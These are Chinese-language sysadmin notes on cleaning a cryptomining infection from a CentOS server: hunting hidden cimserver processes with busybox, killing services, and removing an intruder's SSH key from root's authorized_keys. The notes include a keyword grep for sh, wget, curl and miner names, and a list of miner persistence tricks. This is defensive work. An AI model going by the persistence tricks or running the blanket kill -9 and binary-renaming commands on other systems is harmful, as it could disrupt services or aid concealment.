(3) 重新启动Docker 及其 Rstudio
$ docker ps
Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?

$ sudo service docker status
$ sudo service docker start

$ docker ps -a
$ docker start wjl


查看用户设置
$ docker exec -ti wjl bash
# less /etc/passwd











2. 又一次 CPU 爆满(2022.5.10 20:45)，还找不到是哪个进程占用了

############ CPU 又爆满了!!
# zerotier-one
$ ps -A -o pid,ppid,user,uid,cmd | grep zerotier 
  6460      1 zerotie+   983 /usr/sbin/zerotier-one

$ ps 6460
Signal 17 (CHLD) caught by ps (procps-ng version 3.3.10).
ps:display.c:66: please report this bug
   PID TTY      STAT   TIME COMMAND
  6460 ?        Ssl    4:47 /usr/sbin/zerotier-one

防止其重新运行
$ sudo mv /usr/sbin/zerotier-one /usr/sbin/zerotier-one-Can-Delete


找其子进程
$ ps -A -o pid,ppid,user,uid,cmd | grep 6460
  6460      1 zerotie+   983 /usr/sbin/zerotier-one
没有找到。



$ ps -A -o pid,ppid,user,uid,cmd,%cpu | sort -k 6nr | head
110916 305751 wangjl    1012 htop                        68.6
110518  66868 wangxf    1018 htop                        68.4
112570   5596 root         0 sleep 60                     0.0   #可能的脚本，
107155  98371 wangjl    1012 top                         34.3
 82738      2 root         0 [kworker/u836:2]             3.4
 70493   5406 wuxc      1031 /usr/lib/rstudio-server/bin  2.8
106681      2 root         0 [kworker/u835:1]             2.7
 26328      1 root         0 /usr/bin/containerd          0.7
401786 188834 qin       1003 /usr/libexec/openssh/sftp-s  0.7
189573 188834 qin       1003 /usr/libexec/openssh/sftp-s  0.4

杀死该进程
$ sudo kill -9 6460

查看相关进程
$ ps -A -o pid,ppid,user,uid,cmd | grep -i zerotier





$ ls /etc/ | grep "ld"
autofs_ldap_auth.conf
firewalld
ld.so.cache
ld.so.conf
ld.so.conf.d
openldap
sudo-ldap.conf


$ ps -ef | grep  dbus
wangjl   113872 326437  0 19:51 pts/15   00:00:00 grep --color=auto dbus
dbus     122881      1  0 May09 ?        00:00:02 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
dbus     123225 122881  0 May09 ?        00:00:00 [dbus-daemon] <defunct>
dbus     128335 122881  0 May09 ?        00:00:00 [dbus-daemon] <defunct>
dbus     171838 122881  0 09:30 ?        00:00:00 [dbus-daemon] <defunct>
dbus     193151 122881  0 13:08 ?        00:00:00 [dbus-daemon] <defunct>
dbus     413680 122881  0 15:40 ?        00:00:00 [dbus-daemon] <defunct>






杀掉可疑进程： docker
$ ps -A -o stat,ppid,pid,user,cmd,uid,uname | grep -i contain
Ssl       1  26328 root     /usr/bin/containerd             0 root
S+   326437 120575 wangjl   grep --color=auto contain    1012 wangjl
$ sudo kill -9 26328

过一会又出来了
$ ps -A -o stat,ppid,pid,user,cmd,uid,uname | grep -i contain
Ssl       1 120743 root     /usr/bin/containerd             0 root
$ sudo kill -9 120743

$ sudo service docker status #关着的


发现这个服务是开的：
$ sudo service containerd status
https://containerd.io/
怎么办？
$ containerd --version
containerd containerd.io 1.6.4 212e8b6fa2f44b9c21b2798135fc6fb7c53efc16
$ sudo service containerd stop

终于彻底关了。





杀死可疑进程 
$ ps -A -o stat,ppid,pid,user,uid,uname,cmd | grep -i shiny
Ssl       1   5395 root     /opt/shiny-server/ext/node/     0 root
S    124001 124046 hou      -bash -c cd \/srv\/shiny-se  1001 hou
S    124002 124047 hou      -bash -c cd \/srv\/shiny-se  1001 hou
S+   326531 124530 wangjl   grep --color=auto -i shiny   1012 wangjl

$ ps 5395
Signal 17 (CHLD) caught by ps (procps-ng version 3.3.10).
ps:display.c:66: please report this bug       
   PID TTY      STAT   TIME COMMAND
  5395 ?        Ssl    0:03 /opt/shiny-server/ext/node/bin/shiny-server /opt/shiny-server/lib/main.js
124046 ?        S      0:00 -bash -c cd \/srv\/shiny-server\/sample-apps\/hello && R --no-save --slave -f \/opt\/shiny-server\/R\/SockJSAdapter\.R

$ sudo kill -9 5395
$ ps -A -o stat,ppid,pid,user,uid,uname,cmd | grep -i shiny | awk '{print $3}' | sort | uniq  | sudo xargs kill -9

服务需要关掉:
$ sudo service shiny-server stop

改名字
$ sudo mv /opt/shiny-server/ /opt/shiny-server-Can-Delete



主机卡顿但找不到挖矿进程，可能系统命令被替换了。
使用 busybox 的 top 命令
$ wget https://www.busybox.net/downloads/binaries/1.35.0-x86_64-linux-musl/busybox --no-check-certificate
$ sudo chmod +x busybox
$ ./busybox top

Keys:
	N/M/P/T: show CPU usage, sort by pid/mem/cpu/time
	S: show memory
	R: reverse sort
	H: toggle threads, 1: toggle SMP
	Q,^C: exit







$ ps -aux | grep cimserver
root      82755  0.0  0.0 489088 31088 ?        Ssl  18:27   0:06 cimserver enableHttpConnection=false enableHttpsConnection=false enableAuthentication=true
wangjl   137233  8.0  0.0 123692  1356 pts/6    S+   23:20   0:00 grep --color=auto cimserver
[wangjl@bio_svr1 /]$ ps 82755
Signal 17 (CHLD) caught by ps (procps-ng version 3.3.10).
ps:display.c:66: please report this bug
   PID TTY      STAT   TIME COMMAND
 82755 ?        Ssl    0:06 cimserver enableHttpConnection=false enableHttpsConnection=false enableAuthentication=true

$ ps -A -o stat,ppid,pid,%cpu,user,uid,uname,cmd | grep -i cimserver
Ssl       1  82755  0.0 root         0 root     cimserver enableHttpConnection=false enableHttpsConnection=false enableAuthentication=true





$ ss -lnt                                           
State      Recv-Q Send-Q        Local Address:Port   Peer Address:Port
LISTEN     0      128                       *:22                *:*  
LISTEN     0      128               127.0.0.1:631               *:*  
LISTEN     0      128                       *:8888              *:*  
LISTEN     0      100               127.0.0.1:25                *:*  
LISTEN     0      128               127.0.0.1:6011              *:*  
LISTEN     0      128               127.0.0.1:6013              *:*  
LISTEN     0      50                        *:445               *:*  
LISTEN     0      50                        *:139               *:*  
LISTEN     0      5             192.168.122.1:53                *:*  
LISTEN     0      128                    [::]:22             [::]:*  
LISTEN     0      128                   [::1]:631            [::]:*  
LISTEN     0      100                   [::1]:25             [::]:*  
LISTEN     0      128                   [::1]:6011           [::]:*  
LISTEN     0      128                   [::1]:6013           [::]:*  
LISTEN     0      50                     [::]:445            [::]:*  
LISTEN     0      128                    [::]:3838           [::]:*  
LISTEN     0      50                     [::]:2463           [::]:*  
LISTEN     0      50       [::ffff:127.0.0.1]:41667          [::]:*  
LISTEN     0      50                     [::]:139            [::]:*  
LISTEN     0      32                     [::]:21 

根据进程号查端口号
$ sudo netstat -anp | grep 5395
tcp6       0      0 :::3838                 :::*                    LISTEN      5395/shiny-server 


$ sudo netstat -antp


查找打开的端口：
$ sudo netstat -anpt |grep ' - '
tcp        0      0 172.18.5.193:22         10.20.57.100:58324      ESTABLISHED -                   
tcp6       0      0 172.18.5.193:43470      172.18.5.195:2463       TIME_WAIT   -                   
tcp6       0      0 172.18.5.193:45240      172.18.5.196:2463       TIME_WAIT   -




$ sudo netstat -antp
[sudo] password for wangjl: 
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      6465/cupsd          
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      7592/master         
tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      6467/smbd           
tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      6467/smbd           
tcp        0      0 192.168.122.1:53        0.0.0.0:*               LISTEN      7627/dnsmasq        
tcp        1      0 169.254.95.120:50652    169.254.95.118:5989     CLOSE_WAIT  82755/cimserver     
tcp        0      0 192.168.1.100:36718     192.168.1.101:3260      ESTABLISHED 117578/iscsid       
tcp        1      0 169.254.95.120:50628    169.254.95.118:5989     CLOSE_WAIT  82755/cimserver     
tcp6       0      0 ::1:631                 :::*                    LISTEN      6465/cupsd          
tcp6       0      0 ::1:25                  :::*                    LISTEN      7592/master         
tcp6       0      0 :::445                  :::*                    LISTEN      6467/smbd           
tcp6       0      0 :::2463                 :::*                    LISTEN      5645/java           
tcp6       0      0 127.0.0.1:41667         :::*                    LISTEN      5645/java           
tcp6       0      0 :::139                  :::*                    LISTEN      6467/smbd           
tcp6       0      0 :::21                   :::*                    LISTEN      6470/vsftpd         
tcp6       0      0 172.18.5.193:45102      172.18.5.195:2463       ESTABLISHED 5629/java           
tcp6       0      0 172.18.5.193:46314      172.18.5.195:2463       TIME_WAIT   -                   
tcp6       0      0 172.18.5.193:48084      172.18.5.196:2463       TIME_WAIT   -                   
tcp6       0      0 172.18.5.193:37358      172.18.5.195:2463       ESTABLISHED 5629/java
## sshd 以下被认为正常
tcp        0      0 0.0.0.0:8888            0.0.0.0:*               LISTEN      5406/rserver        
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      6466/sshd           
tcp6       0      0 :::22                   :::*                    LISTEN      6466/sshd           
tcp        0      0 127.0.0.1:6010          0.0.0.0:*               LISTEN      138077/sshd: huangc 
tcp        0      0 127.0.0.1:6011          0.0.0.0:*               LISTEN      17811/sshd: zhouwg@ 
tcp        0      0 127.0.0.1:6013          0.0.0.0:*               LISTEN      19595/sshd: huangcy 
tcp        0      0 172.18.5.193:22         10.20.14.80:52028       ESTABLISHED 38901/sshd: alamin  
tcp        0      0 172.18.5.193:22         10.20.11.203:2014       ESTABLISHED 17726/sshd: zhouwg  
tcp        0      0 172.18.5.193:22         10.20.89.188:53006      ESTABLISHED 138079/sshd: huangc 
tcp        0      0 172.18.5.193:22         10.20.89.188:61624      ESTABLISHED 283294/sshd: wangjl 
tcp        0      0 172.18.5.193:22         10.20.89.188:61689      ESTABLISHED 305050/sshd: wangjl 
tcp        0      0 172.18.5.193:22         10.20.89.188:54984      ESTABLISHED 97792/sshd: wangjl  
tcp        0    196 172.18.5.193:22         10.20.89.188:54992      ESTABLISHED 98271/sshd: wangjl  
tcp        0      0 172.18.5.193:22         10.20.89.188:53118      ESTABLISHED 19435/sshd: huangcy 
tcp        0      0 172.18.5.193:22         10.20.89.188:54905      ESTABLISHED 130587/sshd: wangjl 
tcp        0      0 172.18.5.193:22         10.20.89.188:53119      ESTABLISHED 19608/sshd: huangcy 
tcp        0      0 172.18.5.193:22         10.20.89.188:53005      ESTABLISHED 137996/sshd: huangc 
tcp6       0      0 ::1:6010                :::*                    LISTEN      138077/sshd: huangc 
tcp6       0      0 ::1:6011                :::*                    LISTEN      17811/sshd: zhouwg@ 
tcp6       0      0 ::1:6013                :::*                    LISTEN      19595/sshd: huangcy 




find / -name .sh 










kworker 是 Linux 内核的一部分，说明内核本身占用了很多 CPU。
这可能是内核或驱动程序的bug所致，但也可能是因为某些用户态程序不断的系统调用所致。
我看到你确实在运行很多消耗CPU的程序，试着把他们逐个关掉，看 kworker 的 CPU 占用是否跟着下降。
参考：
https://askubuntu.com/questions/33640/kworker-what-is-it-and-why-is-it-hogging-so-much-cpu
$ dmesg
...
[15951.368442] Pid 103921(node) over core_pipe_limit
[15951.368448] Skipping core dump
[15952.362678] Pid 103923(node) over core_pipe_limit
[15952.362681] Skipping core dump
...







关键字关联可以进程： 
$ ps -elf | grep [sh、wget、curl、xmr、mine、ssh] | grep -v grep
$ ps -elf | grep sh | grep -v grep
https://www.jianshu.com/p/88365cdde963





http://blog.itpub.net/31401608/viewspace-2145324/
$ sudo cimprovider -ls
The CIM server may not be running.

$ sudo cimserver -s

重启cimserver里单个组件
# cimprovider -dm EMSHAProviderModule   #disable EMSHAProviderModule
# cimprovider -em EMSHAProviderModule   #enable EMSHAProviderModule







$ ps -A -o stat,ppid,pid,user,cmd,uid,uname | grep rstudio
Ssl       1   5406 rstudio+ /usr/lib/rstudio-server/bin   986 rstudio-server
S+   326531 120892 wangjl   grep --color=auto rstudio    1012 wangjl
S      5406 169863 root     /usr/lib/rstudio-server/bin     0 root
S      5406 170260 rstudio+ /usr/lib/rstudio-server/bin   986 rstudio-server
S    170260 170261 rstudio+ /usr/lib/rstudio-server/bin   986 rstudio-server
S      5406 170285 root     /usr/lib/rstudio-server/bin     0 root
S      5406 185523 root     /usr/lib/rstudio-server/bin     0 root
S      5406 423583 root     /usr/lib/rstudio-server/bin     0 root


$ sudo service rstudio-server status
...
May 10 16:00:55 bio_svr1 rsession-zhouwg[4349]: WARNING ASSERTION FAILED: !res; LOGGED FROM: rstudio_boost::mutex::~mutex() /opt/rstudio-tools/boost/boost_1_69_0/include/boost/thread/pthread/mutex.hpp:62
May 10 16:00:55 bio_svr1 rsession-zhouwg[4350]: WARNING ASSERTION FAILED: !res; LOGGED FROM: rstudio_boost::mutex::~mutex() /opt/rstudio-tools/boost/boost_1_69_0/include/boost/thread/pthread/mutex.hpp:62
May 10 16:01:07 bio_svr1 rsession-zhouwg[4037]: ERROR session hadabend; LOGGED FROM: rstudio::core::Error {anonymous}::rInit(const rstudio::r::session::RInitInfo&) src/cpp/session/SessionMain.cpp:655





2. 安装新 硬盘 后，速度快了很多，但是还有僵尸进程

$ ps -A -o stat,ppid,pid,user,uid,cmd | grep "^[Zz]" | wc
    172    1204    9596

$ ps -A -o stat,ppid,pid,user,uid,cmd | grep "^[Zz]" | grep "gdm"
Z     11866  11877 gdm         42 [dbus-launch] <defunct>
Z     11931  11932 gdm         42 [dbus-daemon] <defunct>
Z     11931  11937 gdm         42 [dbus-daemon] <defunct>
Z     12455  12456 gdm         42 [ibus-daemon] <defunct>
Z     12455  12457 gdm         42 [ibus-daemon] <defunct>
Z     12032  12552 gdm         42 [gnome-shell] <defunct>
Z     12673  12711 gdm         42 [gsd-media-keys] <defunct>
Z     12696  12745 gdm         42 [gsd-smartcard] <defunct>
Z     12678  12841 gdm         42 [gsd-power] <defunct>



$ ps -A -o stat,ppid,pid,user,uid,cmd | grep "^[Zz]" | awk '{print $4}' | sort | uniq -c | sort -k1nr
    124 huangcy
     76 root
     13 wangjl
      9 gdm
      5 dbus
      3 zhoub
#


















========================================
CPU被挖矿了，却找不到哪个进程！ 如何关掉 cimserver 进程？
----------------------------------------

linux病毒查杀 https://www.jianshu.com/p/88365cdde963

https://blog.51cto.com/u_13294304/2955476
神奇的是，这个进程像是隐身了一般，找不到存在的任何痕迹。
进程如何隐藏
现在说回到本文的正题：Linux操作系统上，进程要隐藏起来，有哪些招数？
要回答这个问题，先来知道ps、top等命令枚举系统的进程列表的原理。
Linux的设计哲学是：一切皆文件！
进程也不例外， Linux系统中有一个特殊的目录：/proc/，这个目录下的内容，不是硬盘上的文件系统，而是操作系统内核暴露出的内核中进程、线程相关的数据接口，也就是procfs，里面记录了系统上正在运行的进程和线程信息，来查看一下：



==> 对抗技巧
文件/定时任务删除失败---------- ---------文件只读属性保护
文件/定时任务删完又出现-------- ---------系统文件替换/下载进程残留
病毒进程刚刚删完又被拉起------- --------恶意进程守护
主机严重卡顿但找不到挖矿进程---- -------系统命令劫持
主机杀干净后一段时间又出现病毒-- -------ssh&漏洞再次入侵




(1) 最后修改了 ssh 文件，随时后门登陆进来。
$ sudo vim /root/.ssh/authorized_keys 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDJB4KLlbSqREMUi/1HTdIBHbeJdtMA4kXgygUWqSZZ3oQBp0XMa5x/QGzLd98vDu7QODUFLQsZdqLHVMzst1XznqmfJI/emdMtsShm14Z0koLxL+ISY7gC2TOOEGkzD5vGU3ahC77gCSGkD5X7xv1bMqAvjhcRYxDRwT+CYYRjG1V4hZhHwpRGgRhqH/GLMtXJbpxBWUbQLPRJpdahP9K6fg1emfkPb0Ulp7yZp7k8bxLdOektocopdW4UHpOmU3ruloqwvUeDFyIxYDZkuDDKpGZhbLpe3gdOVoOmoLZMB9eL0LT5TE4YpluS6DllcqVlZ7CgqYe3na191yQsPzAj root@nih_jin
删掉这一行文字。


还有 root 用户的vim设置有问题

# Registers:
""1     LINE    0
        ^V396
<ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDJB4KLlbSqREMUi/1HTdIBHbeJdtMA4kXgygUWqSZZ3oQBp0XMa5x/QGzLd98vDu7QODUFLQsZdqLHVMzst1XznqmfJI/emdMtsShm14Z0koLxL+ISY7gC2TOOEGkzD5vGU3ahC77gCSGkD5X7xv1bMqAvjhcRYxDRwT+CYYRjG1V4hZhHwpRGgRhqH/GLMtXJbpxBWUbQLPRJpdahP9K6fg1emfkPb0Ulp7yZp7k8bxLdOektocopdW4UHpOmU3ruloqwvUeDFyIxYDZkuDDKpGZhbLpe3gdOVoOmoLZMB9eL0LT5TE4YpluS6DllcqVlZ7CgqYe3na191yQsPzAj root@nih_jin
"2      LINE    0
        ^V396
<ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDJB4KLlbSqREMUi/1HTdIBHbeJdtMA4kXgygUWqSZZ3oQBp0XMa5x/QGzLd98vDu7QODUFLQsZdqLHVMzst1XznqmfJI/emdMtsShm14Z0koLxL+ISY7gC2TOOEGkzD5vGU3ahC77gCSGkD5X7xv1bMqAvjhcRYxDRwT+CYYRjG1V4hZhHwpRGgRhqH/GLMtXJbpxBWUbQLPRJpdahP9K6fg1emfkPb0Ulp7yZp7k8bxLdOektocopdW4UHpOmU3ruloqwvUeDFyIxYDZkuDDKpGZhbLpe3gdOVoOmoLZMB9eL0LT5TE4YpluS6DllcqVlZ7CgqYe3na191yQsPzAj root@nih_jin
"3      LINE    0
        #hou    ALL=(ALL)       ALL
"4      LINE    0
        #hou    ALL=(ALL)       ALL
"5      LINE    0
        # Generated by iptables-save v1.4.21 on Thu May  5 22:42:42 2022
"6      LINE    0
        *filter
"7      LINE    0
        :INPUT ACCEPT [14873:815810]
"8      LINE    0
        :FORWARD ACCEPT [0:0]
"9      LINE    0
        :OUTPUT ACCEPT [6084:80894834]
"-      CHAR    0
        #


# find /home/ | grep authorized_keys
/home/hou/.ssh/authorized_keys
/home/qin2/authorized_keys_node1
/home/rqfu/.ssh/authorized_keys
/home/chaoy/.ssh/authorized_keys
/home/zjhan/.ssh/authorized_keys
/home/zhoub/.ssh/authorized_keys
/home/caow/.ssh/authorized_keys
/home/wangxf/.ssh/authorized_keys
/home/qinpf/.ssh/authorized_keys







(2) 查隐藏进程，使用 busybox
Busybox: 分享你不知道Top 命令参数
https://www.csdn.net/tags/NtTaYg4sNDQyNjUtYmxvZwO0O0OO0O0O.html
https://blog.csdn.net/liuxd3000/article/details/123883324



$ ps -A -o stat,ppid,pid,user,comm | wc
   1903    9768   79083
$ ./busybox ps -A -o stat,ppid,pid,user,comm | wc
   2118   10593   81282

使用 python 调用系统命令，获取 pid ，看隐藏的 pid 是啥？

$ ./busybox ps  | grep cimserver | awk '{print $1}' | sort | uniq | wc
    129     129     775
可能差的就是这 129 个。

特征是，这 129个一直在变换 pid 号？还运行了16小时了？
$ ~/busybox ps  | grep cimserver | head
82764 root     16h40 cimserver enableHttpConnection=false enableHttpsConnection=false enableAuthentication=true  #就是这些进程
82765 root     16h40 cimserver enableHttpConnection=false enableHttpsConnection=false enableAuthentication=true
82766 root     16h40 cimserver enableHttpConnection=false enableHttpsConnection=false enableAuthentication=true
82767 root     16h40 cimserver enableHttpConnection=false enableHttpsConnection=false enableAuthentication=true


$ ps | grep 82764
$ sudo ps -aux | grep 82764

它竟然不在进程文件夹中
$ ls /proc/ | grep "^827"
$ ls /proc/ | grep "^830"






(3) 无法停止该服务，杀掉还会产生新的；无法杀掉这些进程，kill 报错 说这些进程不存在。
$ cimserver --version
2.14.1


$ ps -A -o stat,ppid,pid,user,cmd,uid,uname | grep cimserver
Ssl       1  82755 root     cimserver enableHttpConnect     0 root
[wangjl@bio_svr1 ~]$ ps -A -o stat,ppid,pid,user,cmd,uid,uname | grep 82755
Ssl       1  82755 root     cimserver enableHttpConnect     0 root



$ ~/busybox ps -A -o stat,ppid,pid,user,comm | grep cimserver | head
# STAT PPID  PID   USER     COMMAND
R        1 82764 root     cimserver
R    82764 82765 root     cimserver
R        1 82766 root     cimserver
R    82766 82767 root     cimserver
R        1 82771 root     cimserver
R    82771 82772 root     cimserver
R        1 82773 root     cimserver
R    82773 82776 root     cimserver
R        1 82779 root     cimserver
R    82779 82780 root     cimserver
...

$ ~/busybox ps -A -o stat,ppid,pid,user,comm | grep cimserver | awk '{print $2}' | sort | uniq | sudo xargs kill -9
kill: sending signal to 82764 failed: No such process
kill: sending signal to 82766 failed: No such process
kill: sending signal to 82771 failed: No such process
...
kill: sending signal to 83171 failed: No such process
kill: sending signal to 83179 failed: No such process


也就是说，要使用第三方的 kill 命令 
$ sudo ~/busybox kill -9 82764
$ ~/busybox ps -A -o stat,ppid,pid,user,comm | grep cimserver | awk '{print $2}' | sort | uniq | sudo xargs ~/busybox kill -9
$ ~/busybox ps -A -o stat,ppid,pid,user,comm | grep cimserver | awk '{print $3}' | sort | uniq | sudo xargs ~/busybox kill -9
突然 CPU 就安静了！

关掉这个进程呢？
$ busybox ps -A -o stat,ppid,pid,user,comm | grep cimserver
$ sudo cimserver -s  #关闭
$ sudo cimserver -s shutdownTimeout=5  #5s后关闭

卸载该程序
$ cimserver -v
2.14.1

$ which cimserver
/usr/sbin/cimserver

$ sudo yum remove cimserver
$ sudo yum erase cimserver
Warning: No matches found for: cimserver
No matches found


无法找到
$ yum list | grep cimserver
OR
$ rpm -qa | grep cimserver



找一下，找到了一个匹配
$ sudo find /home/ | grep "cimserver" --color=auto 2>/dev/null
[sudo] password for wangjl: 
/home/rqfu/.local/share/fish/generated_completions/cimserver.fish



$ sudo less /home/rqfu/.local/share/fish/generated_completions/cimserver.fish
# cimserver
# Autogenerated from man page /usr/share/man/man8/cimserver.8.gz
complete -c cimserver -s h -l help --description 'Display the command usage.'
complete -c cimserver -l status --description 'Display the running status of the CIM Server.'
complete -c cimserver -s s --description 'Stop the CIM Server.'
complete -c cimserver -s v -l version --description 'Display the version number or running status of the CIM Server.'


这个 fish 是什么东西？能自动补齐的命令行工具
https://fishshell.com/
https://github.com/fish-shell/fish-shell
fish - the friendly interactive shell



继续删除这个服务：
$ ls -lth /usr/sbin | grep cim
-rwxr-xr-x. 1 root pegasus   76K Apr  1  2020 cimauth
-rwxr-xr-x. 1 root pegasus   92K Apr  1  2020 cimconfig
-rwxr-xr-x. 1 root pegasus   32K Apr  1  2020 cimreparchive
-rwxr-xr-x. 1 root pegasus   40K Apr  1  2020 cimserver
-rwxr-xr-x. 1 root pegasus   72K Apr  1  2020 cimtrust
-rwxr-xr-x. 1 root pegasus   330 Nov 28  2019 cimprovagt
测试了一下，在新安装的 centOS7 上没有，删了？
算了，改名字吧
$ sudo mv /usr/sbin/cimauth /usr/sbin/cimauth-Can-Delete
$ sudo mv /usr/sbin/cimconfig /usr/sbin/cimconfig-Can-Delete
$ sudo mv /usr/sbin/cimreparchive /usr/sbin/cimreparchive-Can-Delete
$ sudo mv /usr/sbin/cimserver /usr/sbin/cimserver-Can-Delete
$ sudo mv /usr/sbin/cimtrust /usr/sbin/cimtrust-Can-Delete
$ sudo mv /usr/sbin/cimprovagt /usr/sbin/cimprovagt-Can-Delete
查看
$ ls -lth /usr/sbin | grep cim

这就算删了吧
$ ls -lth /usr/sbin | grep cim
-rwxr-xr-x. 1 root pegasus   76K Apr  1  2020 cimauth-Can-Delete
-rwxr-xr-x. 1 root pegasus   92K Apr  1  2020 cimconfig-Can-Delete
-rwxr-xr-x. 1 root pegasus   32K Apr  1  2020 cimreparchive-Can-Delete
-rwxr-xr-x. 1 root pegasus   40K Apr  1  2020 cimserver-Can-Delete
-rwxr-xr-x. 1 root pegasus   72K Apr  1  2020 cimtrust-Can-Delete
-rwxr-xr-x. 1 root pegasus   330 Nov 28  2019 cimprovagt-Can-Delete


$ which cimserver
/usr/bin/which: no cimserver in ( ...




==> 等等，还有/tmp临时文件夹
$ sudo find /tmp/ | grep "cimserver" --color=auto 2>/dev/null
/tmp/lenovotools/el7.x64/Bin/lnvgy_utl_tcli01r-2.0.0_rhel7_x86-64/pegasus/bin/cimserver
/tmp/lenovotools/el7.x64/Bin/lnvgy_utl_tcli01r-2.0.0_rhel7_x86-64/pegasus/cimserver.passwd
/tmp/lenovotools/el7.x64/Bin/lnvgy_utl_tcli01r-2.0.0_rhel7_x86-64/pegasus/cimserver_current.conf.bak
/tmp/lenovotools/el7.x64/Bin/lnvgy_utl_tcli01r-2.0.0_rhel7_x86-64/pegasus/cimserver_current.conf

查看
$ less /tmp/lenovotools/el7.x64/Bin/lnvgy_utl_tcli01r-2.0.0_rhel7_x86-64/pegasus/cimserver_current.conf
enableAuthentication=true
enableHttpsConnection=false
enableHttpConnection=false
providerDir=provider/qlogic:provider/emulex:provider/brocade:provider/fusionio:provider/mellanox:

有一个眼熟的一个用户名，新安装的 centOS 没有这个
pegasus:x:66:65:tog-pegasus OpenPegasus WBEM/CIM services:/var/lib/Pegasus:/sbin/nologin

改文件夹名字:
$ sudo mv /tmp/lenovotools /tmp/lenovotools-Can-Delete

禁止掉这个用户
$ sudo vim /etc/shadow
pegasus:!!:17877:::::: #这个用户本来就不能登陆



查找容器相关的条目
$ sudo find /tmp | grep -i contain
/tmp/lenovotools-Can-Delete/el7.x64/Bin/lnvgy_utl_tcli01r-2.0.0_rhel7_x86-64/dct/data/schema/cim_container.xml
/tmp/lenovotools-Can-Delete/el7.x64/Bin/lnvgy_utl_tcli01r-2.0.0_rhel7_x86-64/pegasus/repository/root#emulex/classes/ELXUCNA_Container.CIM_Container
/tmp/lenovotools-Can-Delete/el7.x64/Bin/lnvgy_utl_tcli01r-2.0.0_rhel7_x86-64/pegasus/repository/root#emulex/classes/ELXHBA_ChassisContainsCard.CIM_Container
/tmp/lenovotools-Can-Delete/el7.x64/Bin/lnvgy_utl_tcli01r-2.0.0_rhel7_x86-64/pegasus/repository/root#emulex/classes/CIM_Container.CIM_Component
/tmp/lenovotools-Can-Delete/el7.x64/Bin/lnvgy_utl_tcli01r-2.0.0_rhel7_x86-64/pegasus/repository/root#emulex/classes/ELXUCNA_CardContainsChip.CIM_Container
/tmp/lenovotools-Can-Delete/el7.x64/Bin/lnvgy_utl_tcli01r-2.0.0_rhel7_x86-64/pegasus/repository/root#emulex/classes/ELXHBA_CardContainsConnector.CIM_Container
/tmp/lenovotools-Can-Delete/el7.x64/Bin/lnvgy_utl_tcli01r-2.0.0_rhel7_x86-64/pegasus/repository/root#emulex/classes/ELXHBA_CardContainsChip.CIM_Container
/tmp/lenovotools-Can-Delete/el7.x64/Bin/lnvgy_utl_tcli01r-2.0.0_rhel7_x86-64/pegasus/repository/root#emulex/classes/ELXUCNA_ChassisContainsCard.CIM_Container
/tmp/lenovotools-Can-Delete/el7.x64/Bin/lnvgy_utl_tcli01r-2.0.0_rhel7_x86-64/pegasus/repository/root#qlogic_cmpi/classes/QLogic_Adapter_PhysicalPackagePhysicalPort.CIM_Container
/tmp/lenovotools-Can-Delete/el7.x64/Bin/lnvgy_utl_tcli01r-2.0.0_rhel7_x86-64/pegasus/repository/root#qlogic_cmpi/classes/CIM_Container.CIM_Component
/tmp/lenovotools-Can-Delete/el7.x64/Bin/lnvgy_utl_tcli01r-2.0.0_rhel7_x86-64/pegasus/repository/root#qlogic_cmpi/classes/QLogic_Adapter_PhysicalPackagePhysicalConnector.CIM_Container
/tmp/lenovotools-Can-Delete/el7.x64/Bin/lnvgy_utl_tcli01r-2.0.0_rhel7_x86-64/pegasus/repository/root#LSI_MR_1_3_0/classes/LSIESG_Container.CIM_Container
/tmp/lenovotools-Can-Delete/el7.x64/Bin/lnvgy_utl_tcli01r-2.0.0_rhel7_x86-64/pegasus/repository/root#LSI_MR_1_3_0/classes/CIM_Container.CIM_Component
/tmp/lenovotools-Can-Delete/el7.x64/Bin/lnvgy_utl_tcli01r-2.0.0_rhel7_x86-64/pegasus/repository/root#LSI_MR_1_3_0/classes/CIM_ConnectorOnPackage.CIM_Container
/tmp/lenovotools-Can-Delete/el7.x64/Bin/lnvgy_utl_tcli01r-2.0.0_rhel7_x86-64/pegasus/repository/root#LSI_MR_1_3_0/classes/CIM_PackageInChassis.CIM_Container
/tmp/lenovotools-Can-Delete/el7.x64/Bin/lnvgy_utl_tcli01r-2.0.0_rhel7_x86-64/pegasus/repository/root#LSI_MR_1_3_0/classes/CIM_PackagedComponent.CIM_Container
/tmp/lenovotools-Can-Delete/el7.x64/Bin/lnvgy_utl_tcli01r-2.0.0_rhel7_x86-64/pegasus/repository/root#qlgcnxns/classes/CIM_Container.CIM_Component
/tmp/lenovotools-Can-Delete/el7.x64/Bin/lnvgy_utl_tcli01r-2.0.0_rhel7_x86-64/pegasus/repository/root#PG_InterOp/classes/CIM_ContainedLocation.CIM_Component
/tmp/lenovotools-Can-Delete/el7.x64/Bin/lnvgy_utl_tcli01r-2.0.0_rhel7_x86-64/pegasus/repository/root#PG_InterOp/classes/CIM_ContainedDomain.CIM_SystemComponent
/tmp/lenovotools-Can-Delete/el7.x64/Bin/lnvgy_utl_tcli01r-2.0.0_rhel7_x86-64/pegasus/repository/root#brcmbnxns/classes/CIM_Container.CIM_Component
/tmp/lenovotools-Can-Delete/el7.x64/Bin/lnvgy_utl_tcli01r-2.0.0_rhel7_x86-64/pegasus/repository/root#brocade/classes/BROCADE_PhysicalConnectorContainer.CIM_Container
/tmp/lenovotools-Can-Delete/el7.x64/Bin/lnvgy_utl_tcli01r-2.0.0_rhel7_x86-64/pegasus/repository/root#brocade/classes/CIM_Container.CIM_Component






查看残余
$ rpm -qal  | grep "cimserver"
/etc/Pegasus/cimserver_current.conf
/etc/Pegasus/cimserver_planned.conf
/etc/pki/Pegasus/cimserver_trust
/usr/sbin/cimserver
/usr/share/man/man8/cimserver.8.gz
/var/lib/Pegasus/cache/trace/cimserver.trc
/var/run/tog-pegasus/cimserver.pid
/var/run/tog-pegasus/cimserver_start.lock











僵尸进程
